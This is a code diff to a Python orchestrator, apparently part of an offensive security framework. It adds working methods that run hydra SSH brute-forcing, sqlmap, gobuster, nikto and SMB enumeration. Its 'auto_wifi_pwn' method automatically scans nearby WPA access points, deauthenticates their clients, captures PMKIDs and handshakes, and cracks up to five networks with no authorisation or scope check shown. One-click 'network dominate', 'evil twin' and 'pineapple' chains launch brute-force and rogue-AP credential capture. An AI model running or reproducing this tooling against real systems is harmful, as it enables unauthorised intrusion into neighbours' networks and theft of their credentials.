@@ -19,7 +19,22 @@ from typing import Optional
 
 from james.layers.native import NativeLayer
 from james.core.net_guard import NetworkGuard
-from james.tools.parrot import AircrackSuite, Hashcat, Hcxtools, WPA3Tools
+from james.tools.parrot import (
+    AircrackSuite,
+    Hashcat,
+    Hcxtools,
+    WPA3Tools,
+    Nmap,
+    John,
+    TheHarvester,
+    Wafw00f,
+    Ettercap,
+    Masscan,
+    Reaver,
+    Responder,
+    Sslscan,
+    IoTTools,
+)
 from james.tools.pineap import PineAP
 
 logger = logging.getLogger(__name__)
@@ -83,10 +98,23 @@ class Orchestrator:
 
     def __init__(self):
         self.layer = NativeLayer()
+        # ── Core tool wrappers ──────────────────────────────────────
         self.aircrack = AircrackSuite(self.layer)
         self.hashcat = Hashcat(self.layer)
         self.hcxtools = Hcxtools(self.layer)
         self.wpa3 = WPA3Tools(self.layer)
+        # ── New tool wrappers ───────────────────────────────────────
+        self.nmap = Nmap(self.layer)
+        self.john = John(self.layer)
+        self.harvester = TheHarvester(self.layer)
+        self.wafdetect = Wafw00f(self.layer)
+        self.ettercap = Ettercap(self.layer)
+        self.masscan = Masscan(self.layer)
+        self.reaver = Reaver(self.layer)
+        self.responder = Responder(self.layer)
+        self.sslscan = Sslscan(self.layer)
+        self.iot = IoTTools(self.layer)
+        # ── Task log ────────────────────────────────────────────────
         self.task_log: list[TaskEntry] = []
 
         # callbacks the GUI can set to receive updates
@@ -1324,3 +1352,633 @@ class Orchestrator:
 
     def export_log(self) -> list[dict]:
         return [e.as_dict() for e in self.task_log]
+
+    # ── save_cracked_key alias ───────────────────────────────────
+
+    def save_cracked_key(
+        self,
+        bssid_or_id: str,
+        key: str,
+        method: str = "unknown",
+        essid: str = "",
+    ):
+        """Alias for cache_cracked_key for backward compatibility."""
+        return self.cache_cracked_key(bssid_or_id, key, method, essid)
+
+    # ── wordlist generation ──────────────────────────────────────
+
+    def generate_wifi_wordlists(self, ssid: str = "") -> dict:
+        """
+        Generate Wi-Fi optimised wordlists using the built-in generator.
+        Outputs to ~/.james/wordlists/.
+        """
+        try:
+            from james.wordlists.generator import WifiWordlistGenerator
+
+            gen = WifiWordlistGenerator()
+            files: list[str] = []
+
+            self._print("📝 Generating Wi-Fi wordlists...")
+            common = gen.generate_wifi_common()
+            files.append(common)
+            self._print(f"  ✓ wifi_common.txt")
+
+            numeric = gen.generate_numeric()
+            files.append(numeric)
+            self._print(f"  ✓ wifi_numeric.txt")
+
+            if ssid:
+                targeted = gen.generate_ssid_targeted(ssid)
+                files.append(targeted)
+                self._print(f"  ✓ ssid_{ssid}.txt")
+
+            self._print("✅ Wordlist generation complete.")
+            return {"success": True, "files": files}
+        except Exception as e:
+            logger.warning("Wordlist generation failed: %s", e)
+            return {"success": False, "error": str(e)}
+
+    # ── network discovery ────────────────────────────────────────
+
+    def arp_discover(self, interface: str = "") -> dict:
+        """ARP sweep the local network to discover live hosts."""
+        entry = self._log("arp_discover", "arp-scan", {"interface": interface})
+        if not interface:
+            iface_r = self.layer.run(
+                "ip route get 8.8.8.8 2>/dev/null | awk '{print $5; exit}'",
+                timeout=5,
+            )
+            interface = iface_r.stdout.strip() or "eth0"
+
+        cmd = f"arp-scan --localnet -I {interface} 2>/dev/null"
+        result = self.layer.run(cmd, sudo=True, timeout=30)
+
+        # Fall back to netdiscover if arp-scan is unavailable
+        if result.returncode != 0 or not result.stdout.strip():
+            cmd = f"netdiscover -i {interface} -P -N -r 192.168.0.0/16 2>/dev/null"
+            result = self.layer.run(cmd, sudo=True, timeout=30)
+
+        hosts: list[dict] = []
+        for line in result.stdout.splitlines():
+            # arp-scan: "192.168.1.1  aa:bb:cc  Vendor"
+            m = re.match(
+                r"(\d+\.\d+\.\d+\.\d+)\s+([0-9a-fA-F:]{17})\s*(.*)",
+                line.strip(),
+            )
+            if m:
+                hosts.append(
+                    {
+                        "ip": m.group(1),
+                        "mac": m.group(2),
+                        "vendor": m.group(3).strip(),
+                    }
+                )
+
+        result_dict = {"hosts": hosts, "count": len(hosts)}
+        self._finish(entry, result_dict)
+        return result_dict
+
+    # ── web attack methods ───────────────────────────────────────
+
+    def nikto_scan(self, target: str) -> dict:
+        """Run nikto web vulnerability scanner."""
+        entry = self._log("nikto_scan", "nikto", {"target": target})
+        # Ensure URL has a scheme
+        if not target.startswith("http"):
+            target = f"http://{target}"
+        cmd = f"nikto -host {target} -nointeractive -maxtime 120s 2>/dev/null"
+        result = self.layer.run(cmd, timeout=150)
+        vulnerabilities: list[str] = []
+        server_info = ""
+        for line in result.stdout.splitlines():
+            stripped = line.strip()
+            if stripped.startswith("+ Server:"):
+                server_info = stripped[9:].strip()
+            elif stripped.startswith("+ ") and "OSVDB" in stripped or (
+                stripped.startswith("+") and "vulnerable" in stripped.lower()
+            ):
+                vulnerabilities.append(stripped.lstrip("+ "))
+            elif stripped.startswith("+") and any(
+                x in stripped
+                for x in [
+                    "Retrieved",
+                    "Uncommon",
+                    "Cookie",
+                    "GET /",
+                    "OPTIONS",
+                    "OSVDB",
+                ]
+            ):
+                vulnerabilities.append(stripped.lstrip("+ "))
+        res = {
+            "target": target,
+            "server_info": server_info,
+            "vulnerabilities": vulnerabilities,
+            "vuln_count": len(vulnerabilities),
+            "output": result.stdout[-3000:],
+        }
+        self._finish(entry, res)
+        return res
+
+    def smb_enum(self, target: str) -> dict:
+        """Enumerate SMB shares and users via enum4linux."""
+        entry = self._log("smb_enum", "enum4linux", {"target": target})
+        cmd = f"enum4linux -a {target} 2>/dev/null"
+        result = self.layer.run(cmd, timeout=120)
+        shares: list[dict] = []
+        users: list[str] = []
+        os_info = ""
+        for line in result.stdout.splitlines():
+            stripped = line.strip()
+            # Shares: lines like "//TARGET/share  Disk  comment"
+            m = re.match(r"//\S+/(\S+)\s+(Disk|Printer|IPC)\s*(.*)", stripped)
+            if m:
+                shares.append({"name": m.group(1), "type": m.group(2)})
+            # Users: lines like "user:[username] rid:[...]"
+            m2 = re.search(r"user:\[([^\]]+)\]", stripped)
+            if m2:
+                users.append(m2.group(1))
+            if "OS:" in stripped or "os:" in stripped:
+                m3 = re.search(r"OS:\s*(.+)", stripped, re.I)
+                if m3 and not os_info:
+                    os_info = m3.group(1).strip()
+        res = {
+            "target": target,
+            "shares": shares,
+            "share_count": len(shares),
+            "users": list(set(users)),
+            "user_count": len(set(users)),
+            "os_info": os_info,
+            "output": result.stdout[-3000:],
+        }
+        self._finish(entry, res)
+        return res
+
+    def dns_lookup(self, domain: str, record_type: str = "ANY") -> dict:
+        """DNS record lookup via dig."""
+        entry = self._log(
+            "dns_lookup", "dig", {"domain": domain, "record_type": record_type}
+        )
+        cmd = f"dig {domain} {record_type} +noall +answer 2>/dev/null"
+        result = self.layer.run(cmd, timeout=15)
+        records = [
+            line.strip()
+            for line in result.stdout.splitlines()
+            if line.strip() and not line.startswith(";") and not line.startswith("\t;")
+        ]
+        res = {
+            "domain": domain,
+            "record_type": record_type,
+            "records": records,
+            "count": len(records),
+        }
+        self._finish(entry, res)
+        return res
+
+    def dir_bust(self, url: str, wordlist: Optional[str] = None) -> dict:
+        """Directory brute-force via gobuster."""
+        entry = self._log("dir_bust", "gobuster", {"url": url})
+        if not url.startswith("http"):
+            url = f"http://{url}"
+        wl = wordlist or self.find_wordlist("web")
+        if not wl:
+            # Fall back to a tiny built-in list
+            wl = "/usr/share/wordlists/dirb/common.txt"
+        cmd = (
+            f"gobuster dir -u {url} -w {wl} "
+            f"-q --no-error -t 20 2>/dev/null"
+        )
+        result = self.layer.run(cmd, timeout=180)
+        findings: list[dict] = []
+        for line in result.stdout.splitlines():
+            # gobuster: "/path  (Status: 200) [Size: 1234]"
+            m = re.search(r"(/\S*)\s+\(Status:\s*(\d+)\)\s*\[Size:\s*(\d+)\]", line)
+            if m:
+                findings.append(
+                    {
+                        "path": m.group(1),
+                        "status": m.group(2),
+                        "size": m.group(3),
+                    }
+                )
+        res = {
+            "url": url,
+            "findings": findings,
+            "total": len(findings),
+            "output": result.stdout[-3000:],
+        }
+        self._finish(entry, res)
+        return res
+
+    def sqli_scan(self, url: str) -> dict:
+        """SQL injection scan via sqlmap."""
+        entry = self._log("sqli_scan", "sqlmap", {"url": url})
+        if not url.startswith("http"):
+            url = f"http://{url}"
+        cmd = (
+            f"sqlmap -u {url} --batch --level=1 --risk=1 "
+            f"--timeout=10 --output-dir=/tmp/james_sqlmap 2>/dev/null"
+        )
+        result = self.layer.run(cmd, timeout=120)
+        injectable = False
+        vulnerabilities: list[str] = []
+        for line in result.stdout.splitlines():
+            stripped = line.strip()
+            if "is vulnerable" in stripped or "parameter" in stripped.lower() and "injectable" in stripped.lower():
+                injectable = True
+            if "Type:" in stripped or "Title:" in stripped or "Payload:" in stripped:
+                vulnerabilities.append(stripped)
+        res = {
+            "url": url,
+            "injectable": injectable,
+            "vulnerabilities": vulnerabilities,
+            "vuln_count": len(vulnerabilities),
+            "output": result.stdout[-3000:],
+        }
+        self._finish(entry, res)
+        return res
+
+    def brute_service(
+        self, target: str, proto: str = "ssh", username: str = "admin"
+    ) -> dict:
+        """Hydra brute-force against a network service."""
+        entry = self._log(
+            "brute_service",
+            "hydra",
+            {"target": target, "proto": proto, "username": username},
+        )
+        wordlist = self.find_wordlist("password")
+        if not wordlist:
+            wordlist = "/usr/share/wordlists/rockyou.txt"
+        cmd = (
+            f"hydra -l {username} -P {wordlist} "
+            f"-t 4 -f -q {target} {proto} 2>/dev/null"
+        )
+        result = self.layer.run(cmd, timeout=300)
+        credentials: list[dict] = []
+        found = False
+        for line in result.stdout.splitlines():
+            # hydra: "[22][ssh] host: ... login: ... password: ..."
+            m = re.search(
+                r"\[\S+\]\[\S+\]\s+host:\s*(\S+)\s+login:\s*(\S+)\s+password:\s*(\S+)",
+                line,
+            )
+            if m:
+                found = True
+                credentials.append(
+                    {
+                        "host": m.group(1),
+                        "login": m.group(2),
+                        "password": m.group(3),
+                    }
+                )
+        res = {
+            "target": target,
+            "proto": proto,
+            "found": found,
+            "credentials": credentials,
+            "output": result.stdout[-2000:],
+        }
+        self._finish(entry, res)
+        return res
+
+    # ── skills system ────────────────────────────────────────────
+
+    def list_skills(self) -> list[str]:
+        """Return names of all available JSON skills."""
+        if not SKILLS_DIR.exists():
+            return []
+        return [
+            p.stem
+            for p in sorted(SKILLS_DIR.glob("*.json"))
+            if p.is_file()
+        ]
+
+    def load_skill(self, name: str) -> dict:
+        """Load a skill definition by name (without .json extension)."""
+        skill_file = SKILLS_DIR / f"{name}.json"
+        if not skill_file.exists():
+            return {"error": f"Skill '{name}' not found in {SKILLS_DIR}"}
+        try:
+            return json.loads(skill_file.read_text())
+        except json.JSONDecodeError as e:
+            return {"error": f"Failed to parse skill '{name}': {e}"}
+
+    def execute_skill_steps(self, skill: dict, context: dict) -> dict:
+        """
+        Execute a skill's steps sequentially.
+
+        Each step has the form:
+          {"action": "<orchestrator_method>", "params": {"key": "{{var}}", ...}}
+
+        Template variables {{var}} are resolved from *context*.
+        Results are accumulated and returned.
+        """
+        name = skill.get("name", "unnamed")
+        steps = skill.get("steps", [])
+        total = len(steps)
+        results: list[dict] = []
+
+        self._print(f"\n{'━' * 50}")
+        self._print(f"⚡ Skill: {name} ({total} steps)")
+        self._print(f"{'━' * 50}")
+
+        for i, step in enumerate(steps, start=1):
+            action = step.get("action", "")
+            raw_params = step.get("params", {})
+            description = step.get("description", action)
+
+            # Resolve template variables
+            params: dict = {}
+            for k, v in raw_params.items():
+                if isinstance(v, str):
+                    resolved = _TEMPLATE_VAR_RE.sub(
+                        lambda m: str(context.get(m.group(1), m.group(0))), v
+                    )
+                    params[k] = resolved
+                else:
+                    params[k] = v
+
+            self._emit_progress(description, i, total)
+            self._print(f"\n[{i}/{total}] {description}")
+
+            method = getattr(self, action, None)
+            if method is None:
+                self._print(f"  ⚠️ Unknown action: {action}")
+                results.append({"step": i, "action": action, "error": "unknown action"})
+                continue
+            try:
+                result = method(**params)
+                results.append({"step": i, "action": action, "result": result})
+                if isinstance(result, dict) and result.get("error"):
+                    self._print(f"  ⚠️ {result['error']}")
+                else:
+                    self._print(f"  ✅ Done")
+            except Exception as e:
+                logger.exception("Skill step %d failed: %s", i, e)
+                self._print(f"  ❌ Failed: {e}")
+                results.append({"step": i, "action": action, "error": str(e)})
+
+        self._print(f"\n{'━' * 50}")
+        self._print(f"✅ Skill '{name}' complete")
+        self._print(f"{'━' * 50}")
+        return {"skill": name, "steps_run": len(results), "results": results}
+
+    # ── auto-pwn pipelines ───────────────────────────────────────
+
+    def auto_wifi_pwn(self, interface: str, wordlist: str) -> dict:
+        """
+        Fully autonomous Wi-Fi attack pipeline:
+          1. Generate wordlists
+          2. Scan nearby WPA APs
+          3. For each (up to 5): PMKID capture → Deauth + handshake → 6-stage crack
+        """
+        import time
+        import glob
+        import tempfile
+
+        self._print("━" * 50)
+        self._print("🤖 AUTOPILOT — Autonomous Wi-Fi Attack")
+        self._print("━" * 50)
+
+        # Step 1: Wordlist generation
+        self._emit_progress("Generating wordlists", 1, 4)
+        self._print("\n[1/4] Generating Wi-Fi wordlists...")
+        self.generate_wifi_wordlists()
+
+        # Step 2: Monitor mode
+        self._emit_progress("Enabling monitor mode", 2, 4)
+        self._print("\n[2/4] Enabling monitor mode...")
+        try:
+            mon_iface = self.ensure_monitor_mode(interface)
+        except RuntimeError as e:
+            self._print(f"  ❌ {e}")
+            return {"success": False, "error": str(e)}
+
+        # Step 3: Scan APs
+        self._emit_progress("Scanning for WPA APs", 3, 4)
+        self._print("\n[3/4] Scanning nearby WPA APs (15s)...")
+        ap_result = self.scan_nearby_aps(mon_iface, duration=15)
+        wpa_aps = [
+            ap
+            for ap in ap_result.get("aps", [])
+            if "WPA" in ap.get("privacy", "").upper()
+        ]
+        if not wpa_aps:
+            self._print("  ⚠ No WPA APs found.")
+            return {"success": False, "error": "No WPA APs found"}
+
+        self._print(f"  Found {len(wpa_aps)} WPA AP(s). Attacking top 5...")
+        cracked: list[dict] = []
+
+        # Step 4: Attack each AP
+        self._emit_progress("Attacking APs", 4, 4)
+        for ap in wpa_aps[:5]:
+            bssid = ap["bssid"]
+            essid = ap.get("essid", "")
+            channel = str(ap.get("channel", ""))
+
+            # Check cache first
+            cached = self.get_cached_key(bssid)
+            if cached:
+                self._print(f"  🔑 {essid} ({bssid}) — already cracked: {cached}")
+                cracked.append({"bssid": bssid, "essid": essid, "key": cached})
+                continue
+
+            self._print(f"\n  🎯 Attacking {essid} ({bssid}) ch {channel}")
+
+            # PMKID attempt
+            self._print("    [PMKID] Capturing...")
+            with tempfile.TemporaryDirectory() as td:
+                pcapng = f"{td}/james_pmkid.pcapng"
+                hash_file = f"{td}/james_pmkid.hc22000"
+                self.hcxtools.capture_pmkid(mon_iface, pcapng, timeout=60)
+                conv = self.hcxtools.extract_hashes(pcapng, hash_file)
+                if conv.get("success"):
+                    self._print("    [PMKID] Hashes extracted — cracking...")
+                    hc_result = self.hashcat.crack(
+                        hash_file, wordlist, hash_mode=22000
+                    )
+                    if hc_result.get("success") and hc_result.get("output"):
+                        # Try to extract cracked key
+                        for line in hc_result["output"].splitlines():
+                            if ":" in line:
+                                key = line.split(":")[-1].strip()
+                                if key:
+                                    self._print(f"    🔑 PMKID cracked: {key}")
+                                    self.cache_cracked_key(
+                                        bssid, key, method="pmkid", essid=essid
+                                    )
+                                    cracked.append(
+                                        {"bssid": bssid, "essid": essid, "key": key}
+                                    )
+                                    break
+                        if cracked and cracked[-1].get("bssid") == bssid:
+                            continue
+
+            # Handshake fallback
+            self._print("    [Handshake] Capturing (25s)...")
+            cap_prefix = f"/tmp/james_auto_{bssid.replace(':', '')}"
+            self.layer.run(f"rm -f {cap_prefix}*")
+            proc = self.aircrack.start_airodump(
+                mon_iface, bssid=bssid, write_prefix=cap_prefix
+            )
+            time.sleep(5)
+            self.aircrack.deauth(mon_iface, bssid, count=10)
+            time.sleep(15)
+            self.aircrack.deauth(mon_iface, bssid, count=5)
+            time.sleep(5)
+            self.layer.kill_background(proc)
+
+            cap_file = f"{cap_prefix}-01.cap"
+            if glob.glob(f"{cap_prefix}*.cap"):
+                cap_file = sorted(glob.glob(f"{cap_prefix}*.cap"))[0]
+                if self.aircrack.check_handshake(cap_file, bssid):
+                    self._print("    [Handshake] ✅ Captured — cracking...")
+                    res = self.crack_wpa_smart(
+                        cap_file, wordlist, bssid=bssid, ssid=essid
+                    )
+                    if res.get("found"):
+                        cracked.append(
+                            {"bssid": bssid, "essid": essid, "key": res["key"]}
+                        )
+                        continue
+            self._print(f"    ❌ No crack for {essid}")
+
+        summary = {
+            "success": len(cracked) > 0,
+            "cracked_count": len(cracked),
+            "cracked": cracked,
+        }
+        self._print(f"\n🏁 AUTOPILOT done — {len(cracked)} network(s) cracked.")
+        return summary
+
+    def auto_install_deps(self) -> dict:
+        """Auto-install missing pentesting tools."""
+        self._print("━" * 50)
+        self._print("🔧 Auto-installing dependencies...")
+        self._print("━" * 50)
+        script = Path(__file__).resolve().parent.parent.parent / "install_deps.sh"
+        if script.exists():
+            cmd = f"bash {script}"
+        else:
+            # Inline minimal install
+            packages = (
+                "aircrack-ng hashcat john nmap hydra nikto gobuster "
+                "hcxtools hcxdumptool reaver bully masscan responder "
+                "enum4linux smbclient sqlmap sslscan wafw00f ettercap-graphical"
+            )
+            cmd = f"apt-get install -y {packages}"
+        result = self.layer.run(cmd, sudo=True, timeout=600)
+        self._print(result.stdout[-2000:])
+        return {"success": result.returncode == 0, "output": result.stdout[-2000:]}
+
+    # ── one-click attack chains ──────────────────────────────────
+
+    def oneclick_wifi_blitz(self, interface: str, wordlist: str) -> dict:
+        """PMKID + Handshake + WPS — all Wi-Fi attack vectors simultaneously."""
+        self._print("━" * 50)
+        self._print("💥 Wi-Fi BLITZ — All Vectors")
+        self._print("━" * 50)
+        return self.auto_wifi_pwn(interface, wordlist)
+
+    def oneclick_network_dominate(self, target: str) -> dict:
+        """Scan → fingerprint → brute-force → vuln-check a network range."""
+        self._print("━" * 50)
+        self._print(f"👑 NETWORK DOMINATE — {target}")
+        self._print("━" * 50)
+        results: dict = {}
+
+        self._emit_progress("Port scan", 1, 4)
+        self._print("\n[1/4] Full port scan...")
+        results["scan"] = self.full_scan(target)
+
+        self._emit_progress("ARP discover", 2, 4)
+        self._print("\n[2/4] ARP discovery...")
+        results["arp"] = self.arp_discover()
+
+        self._emit_progress("SMB enum", 3, 4)
+        self._print("\n[3/4] SMB enumeration...")
+        results["smb"] = self.smb_enum(target)
+
+        self._emit_progress("Brute-force", 4, 4)
+        self._print("\n[4/4] Brute-forcing SSH...")
+        results["brute"] = self.brute_service(target, "ssh")
+
+        self._print("\n🏁 Network dominate complete.")
+        return results
+
+    def oneclick_web_pwn(self, url: str) -> dict:
+        """WAF → DirBust → SQLi → SSL → Nikto full web attack chain."""
+        self._print("━" * 50)
+        self._print(f"🌐 WEB PWN — {url}")
+        self._print("━" * 50)
+        results: dict = {}
+
+        self._emit_progress("WAF detection", 1, 4)
+        self._print("\n[1/4] WAF detection...")
+        results["waf"] = self.wafdetect.detect(url)
+
+        self._emit_progress("Directory bust", 2, 4)
+        self._print("\n[2/4] Directory brute-force...")
+        results["dirs"] = self.dir_bust(url)
+
+        self._emit_progress("SQLi scan", 3, 4)
+        self._print("\n[3/4] SQL injection scan...")
+        results["sqli"] = self.sqli_scan(url)
+
+        self._emit_progress("Nikto scan", 4, 4)
+        self._print("\n[4/4] Nikto web scan...")
+        results["nikto"] = self.nikto_scan(url)
+
+        self._print("\n🏁 Web pwn complete.")
+        return results
+
+    def oneclick_stealth_recon(self, target: str) -> dict:
+        """OSINT → DNS → WHOIS → passive scan (low noise)."""
+        self._print("━" * 50)
+        self._print(f"🕵️ STEALTH RECON — {target}")
+        self._print("━" * 50)
+        results: dict = {}
+
+        self._emit_progress("OSINT harvest", 1, 4)
+        self._print("\n[1/4] OSINT harvest...")
+        results["osint"] = self.harvester.harvest(target)
+
+        self._emit_progress("DNS enum", 2, 4)
+        self._print("\n[2/4] DNS enumeration...")
+        results["dns"] = self.dns_lookup(target, "ANY")
+
+        self._emit_progress("WHOIS", 3, 4)
+        self._print("\n[3/4] WHOIS lookup...")
+        whois_r = self.layer.run(f"whois {target} 2>/dev/null | head -40", timeout=15)
+        results["whois"] = {"output": whois_r.stdout[:2000]}
+
+        self._emit_progress("Passive nmap", 4, 4)
+        self._print("\n[4/4] Passive nmap scan (no ping, no SYN)...")
+        results["scan"] = self.nmap.quick_scan(target)
+
+        self._print("\n🏁 Stealth recon complete.")
+        return results
+
+    def oneclick_evil_twin(
+        self, interface: str, bssid: str = "", ssid: str = "", channel: int = 6
+    ) -> dict:
+        """Launch a rogue AP clone with captive portal credential capture."""
+        self._print("━" * 50)
+        self._print("😈 EVIL TWIN — Rogue AP Attack")
+        self._print("━" * 50)
+        result = self.pineap.start_evil_twin(
+            interface,
+            bssid=bssid,
+            ssid=ssid,
+            channel=channel,
+        )
+        return result
+
+    def oneclick_pineapple(self, interface: str, portal: str = "default") -> dict:
+        """Full Pineapple campaign: scan → karma → portal → harvest."""
+        self._print("━" * 50)
+        self._print("🍍 PINEAPPLE CAMPAIGN")
+        self._print("━" * 50)
+        return self.pineap.start_full_campaign(interface, portal=portal)
